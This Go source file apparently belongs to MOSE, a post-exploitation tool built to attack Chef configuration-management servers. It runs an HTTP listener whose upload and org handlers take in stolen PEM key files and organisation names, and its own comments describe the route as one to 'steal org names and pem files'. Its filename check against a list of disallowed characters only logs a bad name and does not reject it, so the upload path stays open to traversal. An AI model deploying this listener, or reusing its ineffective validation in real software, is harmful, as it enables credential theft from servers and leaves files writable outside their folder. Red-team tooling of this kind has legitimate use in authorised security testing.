// Copyright 2020 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package chefutils

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/master-of-servers/mose/pkg/moseutils"
	"github.com/master-of-servers/mose/pkg/netutils"
	"github.com/master-of-servers/mose/pkg/system"
	"github.com/master-of-servers/mose/pkg/userinput"

	"github.com/rs/zerolog/log"
)

// checkInvalidChars detects invalid (and potentially malicious)
// characters from being used in a file name string
func checkInvalidChars(file string) {
	var disallowedChars = []string{
		"..",
		"~",
		"!",
		"@",
		"#",
		"$",
		"%",
		"^",
		"&",
		"*",
		"(",
		")",
		"+",
		"=",
		"{",
		"}",
		"]",
		"[",
		"|",
		"\\",
		"`",
		",",
		"/",
		"?",
		";",
		":",
		"'",
		"\"",
		"<",
		">"}

	for _, c := range disallowedChars {
		if strings.Contains(file, c) {
			log.Error().Msgf("Invalid character in the filename: %v", file)
		}
	}
}

// fileUploader is used to upload files to a listener
func fileUploader(w http.ResponseWriter, r *http.Request) {

	// Limit file uploads to 10 MB files
	if err := r.ParseMultipartForm(10 << 20); err != nil {
		log.Error().Err(err).Msg("")
	}

	file, handler, err := r.FormFile("file")
	if err != nil {
		log.Error().Err(err).Msg("")
		return
	}
	defer file.Close()

	checkInvalidChars(handler.Filename)

	f, err := os.OpenFile(filepath.Join("keys", handler.Filename), os.O_WRONLY|os.O_CREATE, 0666)

	if err != nil {
		log.Error().Err(err).Msg("")
		return
	}
	defer f.Close()

	if _, err := io.Copy(f, file); err != nil {
		log.Error().Err(err).Msg("")
		return
	}

	log.Info().Msgf("Successfully exfilled %v", handler.Filename)
}

// orgUpload is used to exfil org names from a Chef Server
func orgUpload(w http.ResponseWriter, r *http.Request) {
	type Org struct {
		Name string
	}
	var org Org
	if r.Body == nil {
		http.Error(w, "Please send a request body", http.StatusBadRequest)
		return
	}
	err := json.NewDecoder(r.Body).Decode(&org)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	log.Info().Msgf("Successfully uploaded %v", org.Name)
	// TODO: support multiple orgs
	userInput.TargetOrgName = strings.TrimSpace(org.Name)
}

// CreateUploadRoute is used to create an exfil route
// that can be used to steal org names and pem files from a Chef Server
func CreateUploadRoute(userInput userinput.UserInput) {
	var ip string
	if userInput.LocalIP == "" {
		var err error
		ip, err = netutils.GetLocalIP()
		if err != nil {
			log.Error().Err(err).Msg("Unable to get local IP address")
		}
		if ip == "" {
			log.Error().Msg("Unable to get local IP address")
		}
	} else {
		ip = userInput.LocalIP
	}
	if _, err := os.Stat("keys"); os.IsNotExist(err) {
		system.CreateDirectories([]string{"keys"})
	}

	http.HandleFunc("/upload", fileUploader)
	http.HandleFunc("/org", orgUpload)
	proto := "http"
	if userInput.ServeSSL {
		proto = "https"
	}
	moseutils.ColorMsgf("Listener being served at %s://%s:%d/%s-%s for %d seconds", proto, ip, userInput.ExfilPort, userInput.CMTarget, userInput.OSTarget, userInput.TimeToServe)
	srv := netutils.StartServer(userInput.ExfilPort, "", userInput.ServeSSL, userInput.SSLCertPath, userInput.SSLKeyPath, time.Duration(userInput.TimeToServe)*time.Second, false)

	log.Info().Msg("Web server shutting down...")

	if err := srv.Shutdown(context.Background()); err != nil {
		log.Fatal().Err(err).Msg("")
	}
}
